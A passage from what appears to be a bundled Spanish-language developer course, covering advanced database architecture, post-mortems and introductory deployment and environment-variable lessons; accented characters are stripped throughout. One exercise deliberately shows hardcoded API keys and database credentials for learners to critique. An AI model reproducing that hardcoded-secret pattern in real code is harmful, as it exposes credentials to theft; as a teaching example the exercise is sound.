*   **Generic Association (Polymorphic Association):** Usar \`commentable_id\` y \`commentable_type\`. Flexible, pero rompe la integridad referencial a nivel de base de datos (no puedes tener FK reales).

### Modelado de Precios y Auditora (Point-in-Time Architecture)
Nunca sobreescribas un precio en un E-commerce. Si un usuario compr ayer a $10 y hoy sube a $12, su factura debe mantener los $10.
*   **Temporal Tables:** Guardar versiones de los registros con \`valid_from\` y \`valid_to\`.
*   **Event Sourcing (Lnea de tiempo):** No guardas el estado actual, guardas todos los eventos que llevaron a ese estado.

## 2. NoSQL: Patrones Avanzados en Documentos

### Extended Reference Pattern
En lugar de solo guardar el \`user_id\` en un \`Pedido\`, guardas el \`user_id\` Y el \`user_name\`. 
*   **Por qu:** Para evitar un JOIN o una segunda consulta solo para mostrar el nombre en el listado de pedidos.
*   **Riesgo:** Inconsistencia si el usuario cambia su nombre (debes decidir si te importa o si corres un worker en background para actualizarlo).

### Attribute Pattern
til para productos con cientos de caractersticas variables (como una tienda de repuestos).
En lugar de tener 500 columnas, usas un array de objetos: \`[{ key: 'color', val: 'rojo' }, { key: 'material', val: 'acero' }]\`. Permite crear ndices sobre las llaves y valores dinmicamente.

---

## Pregunta de Entrevista Senior
*"Tenemos un sistema de suscripciones. Queremos saber exactamente qu plan tena un usuario en cualquier fecha especfica del pasado para resolver una disputa legal. Cmo disearas el esquema para que sea eficiente y auditable?"*

## Desafo Tcnico
Disea el modelo para un sistema de **Notificaciones** (como el de Facebook). Debe soportar:
1. Diferentes tipos de notificaciones (Like, Comentario, Tag).
2. Notificaciones agrupadas ("A Juan y 5 personas ms les gust tu foto").
3. Marcar como ledas individualmente o en bloque.
`,completed:!1},{id:"db-senior-performance-optimizacion",title:"Performance y Optimizacin a Escala",level:"senior",content:`# Leccin 22: Performance y Optimizacin a Escala

A nivel Senior, la "lentitud" no se soluciona comprando un servidor ms grande (Escalabilidad Vertical), sino optimizando el uso de los recursos existentes.

## 1. Cuellos de Botella Comunes

### Latencia de Red vs Latencia de Disco
Muchas veces el problema no es que la consulta tarde mucho, sino que el backend hace 50 consultas pequeas (Round-trips). 
*   **Optimizacin:** Usar **Batching** o **Stored Procedures** para lgica pesada que requiere mltiples pasos, reduciendo la comunicacin entre App y DB.

### Pressure on Memory (Buffer Pool Hit Ratio)
En bases de datos como PostgreSQL o MySQL, los datos se cargan en RAM (Buffer Pool). Si tu "working set" (los datos que ms se consultan) no cabe en RAM, la DB ir al disco, y el performance caer un 90%.
*   **Estrategia:** Reducir el tamao de las filas. Usa \`INT\` en vez de \`BIGINT\` si no vas a tener billones de registros. Usa \`VARCHAR\` ajustados.

## 2. Advanced Caching Strategies

### Write-Through vs Write-Back vs Cache-Aside
1.  **Cache-Aside (Ms comn):** La app busca en Redis. Si no est, busca en la DB y actualiza Redis.
2.  **Write-Through:** La app escribe en la cache y la cache escribe en la DB. Garantiza consistencia.
3.  **Write-Back:** La app escribe solo en la cache. Un proceso asncrono actualiza la DB despus. Ultra rpido pero riesgoso si la cache falla.

## 3. Optimizacin de Lectura: Materialized Views
Si tienes un dashboard con reportes que tardan 10 segundos en cargar, usa una **Materialized View**. A diferencia de una vista normal, esta guarda el resultado fsico en disco.
*   **Trade-off:** Los datos no son en tiempo real. Debes refrescarla (REFRESH MATERIALIZED VIEW) mediante un trigger o un cron.

---

## Caso de Produccin: "El efecto de las 00:00"
Una app de juegos premiaba a los usuarios a medianoche. 1 milln de usuarios entraban al mismo tiempo. El servidor de DB colapsaba por el pico de conexiones.
*   **Solucin Senior:** Implementar un **Queue-based Load Leveling**. Las acciones de los usuarios van a una cola (RabbitMQ/Kafka) y se procesan a un ritmo que la base de datos pueda soportar, convirtiendo un pico de trfico en una carga constante.

## Desafo Tcnico
Usa \`EXPLAIN ANALYZE\` en una consulta compleja de tu eleccin. Identifica si el costo est en un **Sequential Scan** (falta de ndice) o en un **Hash Join** (uniones pesadas). Propn una mejora.
`,completed:!1},{id:"db-senior-indices-avanzados",title:"ndices Avanzados y Planificador de Consultas",level:"senior",content:`# Leccin 23: ndices Avanzados y Planificador de Consultas

Saber que un ndice acelera bsquedas es Junior. Saber *cmo* la base de datos decide usarlo es Senior.

## 1. Tipos de ndices para Expertos

### ndices Parciales (Partial Indexes)
Para qu indexar toda la columna \`status\` si solo nos interesan los registros \`status = 'PENDING'\`?
\`\`\`sql
CREATE INDEX idx_pending_orders ON orders (created_at) WHERE status = 'PENDING';
\`\`\`
*   **Resultado:** El ndice es mucho ms pequeo, cabe mejor en RAM y es ms rpido de actualizar.

### ndices de Cubrimiento (Covering Indexes - INCLUDE)
Si tu consulta pide el \`email\` y el \`nombre\` buscando por \`email\`, puedes incluir el \`nombre\` en el ndice del \`email\`.
\`\`\`sql
CREATE INDEX idx_user_email_include_name ON users (email) INCLUDE (nombre);
\`\`\`
*   **Beneficio:** **Index Only Scan**. La DB no necesita ir a la tabla principal (Heap) para buscar el nombre; ya lo tiene en el ndice.

### ndices GIN y GiST (PostgreSQL)
*   **GIN (Generalized Inverted Index):** El rey para buscar dentro de JSONB o arrays. 
*   **GiST:** Ideal para datos geogrficos (coordenadas) o rangos de tiempo.

## 2. El Planificador de Consultas (Query Planner)
Antes de ejecutar nada, la DB estima el costo de diferentes caminos.
*   **Statistics:** La DB guarda estadsticas sobre qu tan variados son tus datos (Selectividad). Si una columna tiene el mismo valor en el 90% de las filas, el planificador ignorar el ndice porque un Sequential Scan es ms barato.
*   **Index Scans vs Index Only Scans vs Bitmap Scans:** Debes entender la diferencia para diagnosticar por qu una consulta se volvi lenta de repente.

---

## Pregunta de Entrevista Senior
*"Tenemos un ndice en la columna \`created_at\`. Sin embargo, cuando hacemos \`WHERE DATE(created_at) = '2023-10-10'\`, la consulta es lenta y no usa el ndice. Por qu ocurre esto y cmo lo solucionaras?"*
*   **Respuesta esperada:** Usar una funcin sobre la columna indexada invalida el ndice. Solucin: Crear un **Function-based Index** o cambiar la consulta a un rango: \`WHERE created_at >= '2023-10-10' AND created_at < '2023-10-11'\`.

## Desafo Tcnico
Tienes una tabla con 100 millones de registros de logs. Necesitas buscar palabras clave dentro de un campo de texto \`message\`. Un \`LIKE '%error%'\` es inviable. Configura un ndice de **Full Text Search (FTS)** y compara la velocidad.
`,completed:!1},{id:"db-senior-sharding-replicacion",title:"Sharding, Replicacin y Alta Disponibilidad",level:"senior",content:`# Leccin 24: Sharding, Replicacin y Alta Disponibilidad

Cuando una sola base de datos ya no puede ms, el Arquitecto debe pensar en distribuir la carga. No es solo poner ms mquinas, es gestionar la complejidad de la distribucin.

## 1. Replicacin (Lectura masiva)

### Master-Slave (Primary-Replica)
El patrn ms clsico. Todas las escrituras van al **Master**, y las lecturas se reparten entre los **Slaves**.
*   **Problema:** Lag de replicacin. Escribes un dato, refrescas la pgina y no aparece porque la rplica an no se enter.
*   **Solucin Senior:** "Read-your-own-writes" logic. Si el usuario acaba de escribir algo, furzalo a leer del Master por unos segundos.

### Multi-Master
Varios nodos aceptan escrituras. 
*   **Complejidad:** Resolucin de conflictos. Qu pasa si dos personas editan el mismo campo al mismo tiempo en diferentes nodos? (Algoritmos como Vector Clocks o LWW - Last Write Wins).

## 2. Sharding (Escalabilidad Horizontal de Escritura)
Consiste en partir la base de datos fsicamente en mltiples servidores basados en una **Shard Key**.
*   **Horizontal Sharding:** Usuarios de Amrica en el Servidor A, usuarios de Europa en el Servidor B.
*   **Desafo:** Los JOINS entre shards son casi imposibles o extremadamente lentos. Debes disear el sistema para que casi todas las consultas se resuelvan dentro de un solo shard.

## 3. Estrategias de Failover
Si el nodo principal muere, cunto tarda el sistema en recuperarse?
*   **RTO (Recovery Time Objective):** Tiempo que ests offline.
*   **RPO (Recovery Point Objective):** Cuntos datos pierdes (ej: los ltimos 5 segundos de transacciones).
*   **Quorum:** En sistemas distribuidos (como MongoDB o Cassandra), los nodos votan para elegir un nuevo lder.

---

## Caso de Produccin: "La cada de la Shard Key"
Una red social hizo sharding por \`user_id\`. De repente, un usuario famoso con 100 millones de seguidores poste algo. El servidor donde estaba ese usuario colaps por el trfico (Hot Shard), mientras los otros servidores estaban al 5% de carga.
*   **Leccin:** Elegir una Shard Key con alta cardinalidad y distribucin uniforme es vital.

## Desafo Tcnico
Investiga qu es **Vitess** (usado por YouTube) o **Citus** (para Postgres). Explica cmo permiten escalar bases de datos relacionales como si fueran NoSQL.
`,completed:!1},{id:"db-senior-consistencia-disponibilidad",title:"Consistencia, Disponibilidad y el Teorema CAP",level:"senior",content:`# Leccin 25: Consistencia, Disponibilidad y el Teorema CAP

En un sistema distribuido, no puedes tenerlo todo. El Arquitecto debe elegir qu sacrificar basndose en el modelo de negocio.

## 1. El Teorema CAP (Eric Brewer)
Cualquier sistema distribuido solo puede garantizar 2 de estas 3 propiedades:
1.  **Consistencia (C):** Todos los nodos ven los mismos datos al mismo tiempo.
2.  **Disponibilidad (A):** Todas las peticiones reciben una respuesta (xito o error), sin garanta de que sea la ms reciente.
3.  **Tolerancia a Particiones (P):** El sistema sigue funcionando aunque se rompa la comunicacin entre nodos.

> **Importante:** En la web real, la red siempre puede fallar, por lo que la "P" es obligatoria. La eleccin real es **CP** (Bancos) o **AP** (Redes sociales).

## 2. Modelos de Consistencia

### Strong Consistency
Lento pero seguro. El sistema bloquea los datos hasta que todos los nodos estn sincronizados.
### Eventual Consistency (Consistencia Eventual)
Rpido pero incierto. El sistema garantiza que, si no hay ms escrituras, eventualmente todos los nodos tendrn el mismo dato. (Ej: El contador de "likes" en YouTube).

## 3. Estrategias de Resolucin de Conflictos
Si el nodo A dice que el stock es 5 y el nodo B dice que es 4:
*   **CRDTs (Conflict-free Replicated Data Types):** Estructuras de datos inteligentes que se mezclan solas sin conflictos (usado en chats y editores colaborativos como Google Docs).
*   **Quorum Reads/Writes:** Configuras el sistema para que una lectura solo sea vlida si \`N\` nodos estn de acuerdo.

---

## Pregunta de Entrevista Senior
*"Estamos diseando el sistema de inventario para un Flash Sale (tipo Black Friday). Los productos se agotan en segundos. Elegiras un sistema CP o AP? Por qu?"*
*   **Respuesta esperada:** CP (Consistencia y Particin). Es preferible que el sistema sea un poco ms lento o rechace algunas compras (sacrificar Disponibilidad) antes que vender 100 veces un producto que solo tiene 1 unidad en stock (sobreventa).

## Desafo Tcnico
Analiza la base de datos **Cassandra**. En qu parte del tringulo CAP se ubica? Cmo permite configurar el nivel de consistencia (Tunable Consistency) por cada consulta?
`,completed:!1},{id:"db-senior-transacciones-avanzadas",title:"Transacciones Avanzadas y Aislamiento",level:"senior",content:`# Leccin 26: Transacciones Avanzadas y Aislamiento

Ya conoces el concepto ACID. Ahora profundizaremos en por qu la "I" (Aislamiento) es la ms difcil de implementar y la que ms afecta al performance.

## 1. Niveles de Aislamiento (SQL Standard)

Para evitar bloqueos masivos, las DB permiten relajar el aislamiento:
1.  **Read Uncommitted:** Puedes leer datos que otras transacciones an no han confirmado (Dirty Reads). Peligroso pero ultra rpido.
2.  **Read Committed (Por defecto en muchos):** Solo lees datos confirmados. Evita Dirty Reads pero permite Non-repeatable Reads.
3.  **Repeatable Read:** Garantiza que si lees un dato dos veces en la misma transaccin, ser igual.
4.  **Serializable:** El nivel ms alto. Parece que las transacciones se ejecutan una tras otra. Protege contra "Phantom Reads".
    *   **Costo:** Bloqueos masivos de tablas (Lock Contention).

## 2. Distributed Transactions (2PC y Sagas)

Qu pasa si tienes que actualizar saldo en una DB SQL y dar de alta un permiso en una DB NoSQL en la misma operacin?
*   **Two-Phase Commit (2PC):** Un coordinador pregunta a todos los nodos "Estn listos?". Si todos dicen s, se hace el commit. Si uno falla, todos abortan. Es lento y bloqueante.
*   **Sagas Pattern (Recomendado para Microservicios):** Una serie de transacciones locales. Si el paso 3 falla, se ejecutan "Acciones Compensatorias" para deshacer el paso 1 y 2 (borrado lgico).

## 3. Optimistic vs Pessimistic Locking
*   **Pessimistic:** Bloqueas la fila (\`SELECT ... FOR UPDATE\`). Nadie ms puede tocarla hasta que termines. til cuando hay mucha colisin.
*   **Optimistic:** No bloqueas. Al guardar, verificas si alguien cambi el dato mientras t lo tenas (usando una columna \`version\` o \`updated_at\`). Si alguien lo cambi, rechazas la operacin y pides que el usuario reintente.

---

## Caso de Produccin: "Deadlocks en el sistema de Envo"
Dos transacciones intentan actualizar los mismos dos registros en orden inverso.
T1: Bloquea A, intenta bloquear B.
T2: Bloquea B, intenta bloquear A.
Ambas esperan eternamente.
*   **Solucin Senior:** Establecer un orden estricto de acceso a los recursos o usar timeouts agresivos y reintentos automticos.

## Desafo Tcnico
Implementa un mecanismo de **Optimistic Locking** en una tabla de \`Stocks\`. Asegura que si dos procesos intentan restar 1 unidad de una notebook que tiene stock 1, solo uno tenga xito y el otro reciba un error controlado.
`,completed:!1},{id:"db-senior-sql-nosql-produccion",title:"SQL vs NoSQL en Entornos de Produccin Real",level:"senior",content:`# Leccin 27: SQL vs NoSQL en Entornos de Produccin Real

A nivel Senior, la discusin no es "cul es mejor", sino "cul resuelve mejor el problema actual y el del prximo ao". Incluso, la respuesta suele ser **Arquitectura Polglota** (usar varias).

## 1. Cundo SQL sigue siendo invencible
*   **ERP y Sistemas Contables:** Donde la integridad referencial y las transacciones ACID no son opcionales.
*   **Consultas Ad-hoc complejas:** Si tu equipo de Data Science necesita hacer cruces de datos que no conoces de antemano, SQL y sus JOINS son mucho ms flexibles.

## 2. Cundo NoSQL es obligatorio
*   **High Velocity Ingestion:** Si recibes 500,000 eventos de sensores por segundo (IoT), una DB SQL morir intentando mantener los ndices y el esquema. DBs como Cassandra o InfluxDB estn diseadas para esto.
*   **Esquemas Variables:** Si guardas perfiles de usuarios de diferentes redes sociales (unos tienen 'bio', otros 'followers_count', otros 'metadata_json'), NoSQL brilla.

## 3. El auge de las Bases de Datos NewSQL
Son sistemas que intentan dar la escalabilidad de NoSQL con las garantas ACID de SQL.
*   **CockroachDB:** SQL distribuido diseado para sobrevivir a desastres (puedes apagar un datacenter completo y sigue funcionando).
*   **Google Spanner:** Usa relojes atmicos para garantizar consistencia global en una base de datos distribuida en todo el planeta.

## 4. Arquitectura Polglota (Polyglot Persistence)
Un sistema moderno Senior suele verse as:
*   **PostgreSQL:** Para datos maestros (Usuarios, Facturas).
*   **Redis:** Para sesiones y cache de alta velocidad.
*   **ElasticSearch:** Para el buscador del sitio (Bsquedas difusas).
*   **MongoDB:** Para logs de actividad o perfiles dinmicos.

---

## Pregunta de Entrevista Senior
*"Tenemos una aplicacin de mensajera tipo WhatsApp. Dnde guardaras la informacin del perfil del usuario y dnde guardaras el historial de mensajes? Justifica tcnicamente."*
*   **Respuesta Senior:** Perfiles en SQL (datos estructurados, poca frecuencia de cambio). Mensajes en una DB Columnar o de Documentos optimizada para escritura masiva (como Cassandra o ScyllaDB), ya que el volumen de mensajes crecer exponencialmente y no necesitas JOINS entre mensajes.

## Desafo Tcnico
Investiga qu es un **Vector Database** (como Pinecone o Milvus). Explica por qu son vitales para aplicaciones de Inteligencia Artificial y LLMs (RAG).
`,completed:!1},{id:"db-senior-errores-criticos-reales",title:"Errores Crticos y Post-mortems Reales",level:"senior",content:`# Leccin 28: Errores Crticos y Post-mortems Reales

Un Arquitecto Backend se curte en las batallas de produccin. Aprender de los errores de otros es la forma ms barata de ganar experiencia.

## 1. El ndice que mat a Produccin
**Escenario:** Tienes una tabla con 200 millones de filas. Ejecutas un \`CREATE INDEX\` en horario pico.
*   **Error:** Por defecto, esto bloquea todas las escrituras en la tabla hasta que termine (horas).
*   **Solucin Senior:** Usar \`CREATE INDEX CONCURRENTLY\` (en Postgres) o herramientas de migracin Online (como \`gh-ost\` para MySQL). Tarda ms, pero no bloquea el negocio.

## 2. La trampa del "Default Value"
**Escenario:** Agregas una columna \`active BOOLEAN DEFAULT true\` a una tabla masiva.
*   **Error:** En versiones antiguas de DBs, esto rescribe fsicamente cada fila del disco para poner el \`true\`. Resultado: I/O al 100% y site cado por 30 minutos.
*   **Solucin Senior:** Agregar la columna como nullable, y luego correr un script de actualizacin por bloques (batches).

## 3. Agotar el espacio de IDs (Integer Overflow)
**Escenario:** Usaste \`INT\` (32 bits) para el ID de una tabla de Logs que creci ms de lo esperado. Al llegar al registro 2,147,483,647, la DB deja de aceptar registros.
*   **Error:** Disaster recovery de emergencia. Migrar a \`BIGINT\` en una tabla viva de ese tamao es extremadamente complejo.
*   **Solucin Senior:** Empezar siempre con \`BIGINT\` para tablas que sabes que van a crecer, o usar \`UUID\`.

## 4. Olvidar el Timeout en el Pool de Conexiones
**Escenario:** Una consulta lenta se queda pegada. El pool de conexiones se llena de procesos esperando. Nuevos usuarios no pueden entrar.
*   **Solucin Senior:** Configurar estrictamente el \`statement_timeout\` y el \`idle_in_transaction_session_timeout\`. Es mejor que una consulta de un usuario falle por timeout a que todo el sistema colapse para todos.

---

## Caso Real: "El borrado accidental"
Un desarrollador junior confundi la terminal de Testing con la de Produccin y ejecut un \`DROP TABLE\`.
*   **Respuesta del Arquitecto:** No entres en pnico. Si tienes una estrategia de **Point-In-Time-Recovery (PITR)**, puedes restaurar la base de datos al estado exacto que tena un segundo antes del comando fatal usando los logs de transacciones (WAL).
*   **Leccin:** Un backup diario no es suficiente. Necesitas recuperacin por logs.

## Desafo Tcnico
Crea un plan de "Disaster Recovery" para tu proyecto actual. Qu pasa si el proveedor de Cloud desaparece maana? Dnde estn tus backups y cunto tiempo tardaras en estar online de nuevo? (RTO).
`,completed:!1},{id:"db-senior-ejercicios",title:"Ejercicios Prcticos: Arquitectura Senior",level:"senior",content:`# Ejercicios Prcticos: Arquitectura de Bases de Datos Senior

A continuacin presentamos desafos tcnicos de nivel arquitectnico. No se busca solo "que funcione", sino que sea escalable, resiliente y eficiente.

---

## 1. Diseo de Sistema: El Feed de Noticias Global
**Contexto:** Debes disear la base de datos para una red social con 500 millones de usuarios activos. 

**Consigna:**
*   Cmo modelaras las relaciones de "seguido/seguidor" para que la consulta de "obtener posts de la gente que sigo" no tarde segundos?
*   Qu estrategia de Sharding usaras para los posts?
*   Propn una capa de Cache (Redis) y explica qu datos guardaras ah y con qu poltica de expiracin.

---

## 2. Optimizacin: El Reporte de Ventas Agnico
**Contexto:** Una empresa de retail tiene una tabla \`Ventas\` con 1 billn de registros. El reporte mensual de "Ventas por Categora y Regin" antes tardaba 2 minutos y ahora da Timeout.

**Consigna:**
*   Propn una estrategia usando **Materialized Views**.
*   Explica cmo manejaras el refresco de los datos si el negocio pide que el reporte no tenga ms de 1 hora de retraso.
*   Ayudara el **Table Partitioning** (particionamiento por mes)? Justifica cmo lo implementaras.

---

## 3. Transacciones: El Sistema de Envo de Dinero Cripto
**Contexto:** Debes asegurar una transferencia entre un saldo en una base de datos relacional y el registro de una transaccin en una Blockchain (que es asncrona y puede fallar).

**Consigna:**
*   Implementa el patrn **Outbox Pattern** para garantizar que el historial de la transaccin se guarde solo si el saldo se rest correctamente.
*   Explica cmo manejaras el caso donde el servicio de saldo descuenta el dinero pero el servicio de blockchain nunca confirma la transaccin (Acciones Compensatorias).

---

## 4. Consistencia: El Inventario en Black Friday
**Contexto:** Tienes 5 rplicas de lectura y 1 master de escritura. Hay 10 unidades de un iPhone en oferta.

**Consigna:**
*   Explica tcnicamente qu pasara si un usuario ve "Stock: 1" (ledo de una rplica asncrona) pero al intentar comprar el master dice "Stock: 0".
*   Cmo usaras **Pessimistic Locking** (\`SELECT FOR UPDATE\`) para evitar la sobreventa?
*   Qu impacto tiene esto en la disponibilidad (Availability) del sitio?

---

## 5. Migracin: El Cambio de ID
**Contexto:** Tu tabla de \`Usuarios\` usa \`INT\` incremental pero se est agotando. Debes migrarla a \`BIGINT\` sin que el sitio deje de funcionar (Zero Downtime).

**Consigna:**
*   Describe los pasos tcnicos (Batch updates, Triggers de sincronizacin, etc.) para realizar esta migracin en una tabla de 2 billones de registros.

---

Este nivel de pensamiento es lo que diferencia a un programador de un Arquitecto de Software! 
`,completed:!1,isProject:!0},{id:"db-senior-evaluacion",title:"Evaluacin Arquitectura Senior",level:"senior",content:`# Evaluacin Final: Arquitectura de Bases de Datos Senior

Este examen evala tu capacidad para tomar decisiones crticas de infraestructura y diseo de datos bajo presin y a gran escala.

## 1. Escenario de Decisin (Arquitectura)
Tienes un sistema que recibe GPS de 100,000 camiones cada 5 segundos.
*   Qu base de datos elegiras y por qu? (SQL vs NoSQL vs Time-Series).
*   Cmo manejaras la purga de datos antiguos (Retention Policy) para que el disco no se llene?

## 2. Anlisis de Performance
Se te presenta un \`EXPLAIN ANALYZE\` que muestra un "Sort Method: external merge Disk".
*   Qu significa este error?
*   Cmo lo solucionaras cambiando la configuracin de la base de datos o la consulta?

## 3. Transacciones Distribuidas
Explica la diferencia entre el patrn **Two-Phase Commit** y el patrn **Saga**.
*   En qu caso de uso real de un banco usaras cada uno?
*   Cul es ms tolerante a fallos de red?

## 4. Diseo de Resiliencia
Tu base de datos principal est en AWS Virginia (us-east-1). Esta regin se cae por completo.
*   Explica la diferencia entre una rplica **Sncrona** y una **Asncrona** en este contexto.
*   Qu estrategia de "Multi-Region" propondras para un RTO (tiempo de recuperacin) menor a 5 minutos?

## 5. El Teorema CAP aplicado
Un cliente te pide un sistema que sea 100% consistente y 100% disponible incluso si hay una particin de red.
*   Qu le respondes tcnicamente como Arquitecto?

---

## Criterios de Evaluacin Senior
* [ ] Capacidad para justificar trade-offs (ventajas y desventajas) de cada decisin.
* [ ] Dominio de conceptos de bajo nivel (I/O, RAM, Locks).
* [ ] Entendimiento de sistemas distribuidos y consistencia.
* [ ] Enfoque en la continuidad del negocio (Zero Downtime).
* [ ] Conocimiento de patrones de diseo modernos.

Felicidades por completar el camino del Arquitecto de Datos! Tu visin de los sistemas ha cambiado para siempre. 
`,completed:!1,isProject:!0}]},Hx={id:"deploy-devops",title:"Deploy & DevOps",description:"Aprende a llevar tus aplicaciones al mundo real, desde hosting esttico hasta infraestructuras en la nube.",completed:!1,lessons:[{id:"deploy-devops-01-que-es-deploy",title:"Qu es el Deploy? De tu compu al mundo",level:"junior",content:`# Leccin 01: Qu es el Deploy? De tu compu al mundo

Muchos programadores terminan su cdigo, funciona en su computadora y dicen: "Listo, termin!". Pero el cdigo solo sirve si otras personas pueden usarlo.

## 1. Qu es el Deploy (Despliegue)?
El **Deploy** es el proceso de mover tu cdigo desde tu computadora personal a un **Servidor** (una computadora que siempre est encendida y conectada a internet) para que cualquiera pueda entrar mediante una URL (ej: \`tu-app.com\`).

## 2. Desarrollo vs. Produccin
A partir de ahora, vas a separar tu vida en dos mundos:
*   **Entorno de Desarrollo (Localhost):** Es tu laboratorio. Aqu el cdigo puede fallar, puedes probar cosas locas y solo t lo ves.
*   **Entorno de Produccin:** Es la vida real. Es donde entran tus usuarios. Aqu el cdigo debe ser estable, rpido y seguro.

## 3. Cmo llega el cdigo all?
Antes, los programadores suban archivos por algo llamado FTP (como mover carpetas a mano). Hoy usamos una forma mucho ms inteligente: **Git**.
T subes tu cdigo a GitHub, y el servidor de produccin "escucha" ese cambio y se actualiza solo.

---

### Concepto Junior:
Hacer "Deploy" no es solo copiar y pegar archivos. Es preparar tu aplicacin para que soporte el trfico de personas reales.

### Ejercicio Mental 1:
Si tienes una red social y borras una lnea de cdigo por error en tu computadora (Desarrollo), se enteran tus usuarios? En qu momento se enteraran?
`,completed:!1},{id:"deploy-devops-02-build-y-hosting",title:'El proceso de "Build" y Static Hosting',level:"junior",content:`# Leccin 02: El proceso de "Build" y Static Hosting

Cuando programas en React, usas archivos modernos que los navegadores viejos no entienden del todo. Por eso, antes de subir tu app, ocurre una transformacin mgica llamada **Build**.

## 1. Qu es el Build?
El comando \`npm run build\` toma todos tus archivos de React, tus imgenes y tu CSS, y los convierte en un solo paquete de archivos HTML, JS y CSS ultra optimizados y pequeos.
*   **Resultado:** Una carpeta llamada \`dist\` o \`build\`. Eso es lo nico que el servidor necesita para mostrar tu web.

## 2. Dnde lo subo? (Vercel y Netlify)
Para proyectos de frontend, usamos plataformas de "Static Hosting". Son geniales porque son gratis para proyectos pequeos y se encargan de todo.
*   **Vercel:** Muy usado para Next.js y React. Conectas tu GitHub y cada vez que haces un \`git push\`, tu web se actualiza en segundos.
*   **Netlify:** Muy similar a Vercel, excelente para sitios estticos y muy fcil de usar.

## 3. El flujo profesional
1. Programas en tu compu.
2. Guardas cambios en GitHub (\`git commit\` + \`git push\`).
3. Vercel/Netlify detecta el cambio.
4. Ejecutan el \`build\` automticamente en la nube.
5. Tu web tiene una nueva versin en vivo!

---

### Error Comn:
Intentar subir la carpeta \`node_modules\` al servidor. **NUNCA lo hagas!** Es pesadsima y no hace falta. El servidor instalar lo que necesite usando tu archivo \`package.json\`.

### Ejercicio Prctico 2:
Entra a tu terminal y ejecuta \`npm run build\` en tu proyecto actual. Mira la carpeta que se genera. Ves algn archivo \`.jsx\` o todo es puramente \`.js\` y \`.html\`?
`,completed:!1},{id:"deploy-devops-03-variables-entorno",title:"Variables de Entorno (.env) y Seguridad",level:"junior",content:`# Leccin 03: Variables de Entorno (.env) y Seguridad

Imagina que tu aplicacin necesita conectarse a una Base de Datos y tienes una contrasea secreta. Si dejas esa contrasea escrita en tu cdigo y lo subes a GitHub, cualquiera podra verla y robar tus datos.

## 1. Qu son las Variables de Entorno?
Son una forma de guardar secretos o configuraciones fuera de tu cdigo.
*   En tu computadora, creas un archivo llamado \`.env\`.
*   Dentro escribes algo como: \`DB_PASSWORD=secreto123\`.
*   En tu cdigo usas \`process.env.DB_PASSWORD\`.

## 2. El archivo .gitignore
Este es el archivo ms importante para tu seguridad. Ah debes escribir \`.env\` para que Git ignore ese archivo y **nunca** lo suba a internet.

## 3. Cmo sabe el servidor mi clave entonces?
En el panel de control de Vercel, Netlify o cualquier servidor, hay una seccin llamada **"Environment Variables"**. Ah debes escribir tus claves manualmente una por una.
De esta forma, la clave vive en el servidor pero nadie puede verla en el cdigo de GitHub.

## 4. Diferencias entre Desarrollo y Produccin
A veces quieres que en tu computadora la app use una URL de prueba y en internet use la real.
*   \`.env.development\`: Configuraciones para tu compu.
*   \`.env.production\`: Configuraciones para el sitio en vivo.

---

### Regla de Oro:
Si subiste un \`.env\` a GitHub por error, aunque lo borres, queda en el historial. Debes **cambiar la clave inmediatamente** (rotar la clave) porque ya se considera comprometida.

### Ejercicio Mental 3:
Si ests haciendo una pgina web que muestra el mapa de Google y necesitas una "API Key" que cuesta dinero cada vez que se usa, dnde la guardaras y cmo te aseguraras de que nadie te la robe para usarla en su propio sitio?
`,completed:!1},{id:"deploy-devops-04-practica-junior",title:"Junior Deploy",level:"junior",content:`# Ejercicios y Evaluacin: Junior Deploy

Demuestra que ests listo para llevar tus creaciones al mundo real.

---

## 1. Ejercicio: El Check de Seguridad
Mira el siguiente cdigo. Ves algn problema de seguridad relacionado con el Deploy?

\`\`\`javascript
// config.js
export const API_KEY = "sk_test_51Mz...8891"; // Clave de pago de Stripe
export const URL_DB = "mongodb+srv://admin:papas123@cluster0.abc.com";
\`\`\`
*Consigna:* Explica qu debera hacer el programador para corregir esto y cmo se usara en el cdigo.

## 2. Ejercicio: El Misterio del Build
Un compaero de equipo te dice: "Mi app funciona genial cuando escribo \`npm run dev\`, pero cuando hago el deploy a Vercel, la pantalla sale en blanco".
1. Qu comando le diras que ejecute en su propia computadora para ver si hay errores antes de subirlo?
2. Qu carpeta debera revisar para ver si se generaron los archivos comprimidos?

## 3. Evaluacin: Conceptos Base
*   Cul es la diferencia principal entre el entorno de **Desarrollo** y el de **Produccin**?
*   Nombra dos plataformas gratuitas para subir el **Frontend** de una aplicacin.
*   Por qu es una mala idea subir la carpeta \`node_modules\` al servidor?

---

### Criterios de Aprobacin
* [ ] Sabe la diferencia entre \`dev\` y \`build\`.
* [ ] Entiende la importancia de ocultar secretos en archivos \`.env\`.
* [ ] Conoce el flujo de trabajo GitHub -> Hosting.

Felicidades! Si manejas estos conceptos, ya dejas de ser un "programador de computadora local" para convertirte en un desarrollador que publica software. 
`,completed:!1,isProject:!0},{id:"deploy-devops-05-backend-deploy",title:"Deploy de Backend y Bases de Datos (Semi-Senior)",level:"semi-senior",content:`# Leccin 05: Deploy de Backend y Bases de Datos (Semi-Senior)

A diferencia del Frontend (que son solo archivos estticos), el **Backend** es un proceso vivo que debe correr 24/7 en un servidor. Como Semi-Senior, debes aprender a gestionar servidores que ejecutan cdigo lgica y mantienen conexiones a bases de datos.

## 1. Dnde vive el Backend? (PaaS)
Usamos plataformas como **Render**, **Railway** o **Firebase Functions**. Estas herramientas se encargan de:
*   Instalar Node.js.
*   Correr tu comando de inicio (\`npm start\`).
*   Mantener el servidor encendido si hay un error (auto-restart).

## 2. La arquitectura Frontend-Backend separada
En esta etapa, tus aplicaciones se dividen en dos URLs distintas:
*   \`mi-app.vercel.app\` (El cliente/frontend).
*   \`api.mi-app.railway.app\` (El servidor/backend).
**Desafo:** Debes configurar el **CORS** en el backend para permitir que solo tu URL de frontend pueda hacer peticiones.

## 3. Bases de Datos en la Nube
No instales la DB en el mismo servidor del backend. Usa servicios gestionados como:
*   **MongoDB Atlas** (Para NoSQL).
*   **Supabase** o **Neon** (Para PostgreSQL).
*   **PlanetScale** (Para MySQL).

## 4. Logs y Monitoreo Bsico
Si tu app falla en produccin, no puedes ver la consola de tu navegador. Necesitas ver los **Server Logs**.
*   **Regla de Oro:** Nunca dejes un \`console.log\` con datos sensibles. Usa libreras como \`Winston\` o \`Pino\` para logs profesionales que se puedan buscar por fecha y nivel de error (Info, Warning, Error).

---

### Caso Real de Produccin:
Un backend en Render se apagaba cada 15 minutos de inactividad (plan gratuito). Cuando un usuario entraba, la primera peticin tardaba 30 segundos en responder.
**Solucin Semi-Senior:** Entender el concepto de "Cold Start" y decidir si el negocio necesita un plan pago para tener "instancias siempre encendidas".
